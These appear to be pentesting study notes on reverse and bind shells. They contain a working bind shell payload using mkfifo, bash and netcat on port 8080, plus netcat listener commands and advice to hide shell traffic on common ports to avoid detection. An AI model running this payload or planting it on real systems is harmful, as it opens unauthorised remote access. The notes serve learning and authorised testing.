# Shells

## Reverse Shell
- reverse shells initiate from the target machine back to the attacker machine. This can help avoid IDS and bypass firewalls since the connection is coming from and not to the machine. 
- you need to set up a listener for these.
- reverse shells connect back to the listener and you interact with it from there.
- **Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445.** This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.
- [Reverse shell payloads cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- You need to set up a nc listener with `nc -nvlp TARGET_IP PORT`



## Bind Shell
- A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely. This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.
- Bind shell example payload: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
- We need to note that ports below **1024** will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.
- You need to set up a nc listener with: `nc -nv TARGET_IP 8080`
